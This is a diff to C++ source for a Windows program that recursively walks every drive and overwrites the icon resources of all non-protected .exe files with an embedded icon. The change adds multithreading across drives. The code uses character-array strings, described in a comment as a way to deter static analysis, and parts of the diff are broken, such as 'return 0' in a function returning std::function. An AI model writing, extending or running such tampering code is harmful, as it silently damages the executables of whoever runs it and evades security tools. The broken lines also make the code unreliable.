@@ -1,7 +1,7 @@
 /* TODO: 
    - Rename variables to appropriate designations.
    - Get the locale language of the machine and update 1812,1813 error (line 136) to use it instead of default English 1033.
-   - Implement threading to work on multiple drives at once and possibly start from top-bottom of drive data to meet in middle.
+   + Implement threading to work on multiple drives at once and possibly start from top-bottom of drive data to meet in middle.
 */ 
 
 #include <chrono>
@@ -11,6 +11,7 @@
 #include <map>
 #include <thread>
 #include <vector>
+#include <functional>
 
 #include <Windows.h>
 #include <Sfc.h>
@@ -32,35 +33,37 @@ std::vector<std::wstring> GetDriveLetters()
         concatDrivePath += diskLetter;
         concatDrivePath += driveSlash; // Effectively "C:\", then next iteration "D:\", etc.
 
-        if (std::filesystem::exists(concatDrivePath))
+        if (!std::filesystem::exists(concatDrivePath))
         {
-            drivetype = ::GetDriveTypeW(concatDrivePath.c_str());
-            /* 
-                https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew
-            
-                DRIVE_UNKNOWN
-                0	The drive type cannot be determined.
-
-                DRIVE_NO_ROOT_DIR
-                1	The root path is invalid; for example, there is no volume mounted at the specified path.
-
-                DRIVE_REMOVABLE
-                2	The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
-
-                DRIVE_FIXED
-                3	The drive has fixed media; for example, a hard disk drive or flash drive.
-
-                DRIVE_REMOTE
-                4	The drive is a remote (network) drive.
-
-                DRIVE_CDROM
-                5	The drive is a CD-ROM drive.
-
-                DRIVE_RAMDISK
-                6 	The drive is a RAM disk. 
-            */
-            
+            concatDrivePath = L"";
+            continue;
         }
+
+        drivetype = ::GetDriveTypeW(concatDrivePath.c_str());
+        /* 
+            https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew
+            
+            DRIVE_UNKNOWN
+            0	The drive type cannot be determined.
+
+            DRIVE_NO_ROOT_DIR
+            1	The root path is invalid; for example, there is no volume mounted at the specified path.
+
+            DRIVE_REMOVABLE
+            2	The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
+
+            DRIVE_FIXED
+            3	The drive has fixed media; for example, a hard disk drive or flash drive.
+
+            DRIVE_REMOTE
+            4	The drive is a remote (network) drive.
+
+            DRIVE_CDROM
+            5	The drive is a CD-ROM drive.
+
+            DRIVE_RAMDISK
+            6 	The drive is a RAM disk. 
+        */
             
         if (drivetype != 5 && drivetype != 0) 
         {
@@ -98,12 +101,12 @@ BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG
     return true;
 }
 
-void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
+std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
 {
     // Using a char array instead of string in an attempt to deter static analysis string identification.
     wchar_t exeExt[] = {'.', 'e', 'x', 'e', 0};
 
-    for (auto itr_path : std::filesystem::recursive_directory_iterator(*pathStart, std::filesystem::directory_options::skip_permission_denied)) 
+    for (auto itr_path : std::filesystem::recursive_directory_iterator(pathStart, std::filesystem::directory_options::skip_permission_denied)) 
     {
         // If current file is not .EXE, skip to next file.
         if (!(itr_path.path().extension() == exeExt)) 
@@ -111,8 +114,11 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
             continue;
         }
 
+        
+
         const std::wstring currentPath = itr_path.path().wstring(); // Change from utf-8 to utf-16 'wide'string
        
+        std::wcout << currentPath;
 
         // Check if current file is a system protected file. If so, skip.
         if (::SfcIsFileProtected(NULL, currentPath.c_str())) 
@@ -219,6 +225,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
 
         resNames.clear();
     }
+    return 0;
 }
 
 // void ReplaceSysIcons()
@@ -259,11 +266,17 @@ int main() {
     }
 
     std::vector<std::wstring> drives = GetDriveLetters();
+    std::vector<std::thread> threadPool;
 
     for (auto& drive : drives) 
     {
         std::filesystem::path drivepath = drive.c_str();
-        ReplaceEXEIconResources(&drivepath, lpMDcanIcon, dwMDcanIconSize);
+        threadPool.push_back(std::thread(ReplaceEXEIconResources, drivepath, lpMDcanIcon, dwMDcanIconSize));
+    }
+
+    for (auto& thread : threadPool)
+    {
+        thread.join();
     }
 
     UnlockResource(lpMDcanIcon);
